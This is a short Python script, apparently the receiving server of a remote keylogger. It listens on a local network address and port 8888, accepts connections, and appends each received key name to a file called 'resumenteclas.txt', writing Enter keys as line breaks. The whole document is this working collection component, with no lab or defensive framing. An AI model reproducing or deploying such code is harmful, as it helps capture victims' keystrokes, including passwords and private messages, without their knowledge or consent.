import socket
import os
def escribir(tecla):
    with open('resumenteclas.txt', 'a')as archivo:
        if(tecla == 'Key.enter'):
            archivo.write(tecla + os.linesep)
        else:
            archivo.write(tecla)
        print('tecla:' + tecla)

mi_socket = socket.socket()
mi_socket.bind(('192.168.1.42', 8888))
mi_socket.listen(3)

print("hola mundo")
while True:
    conexion, addr = mi_socket.accept()
    print("nueva conexion:")
    print(addr)

    respuesta = conexion.recv(1024)
    print(str(respuesta))
    escribir(str(respuesta))
    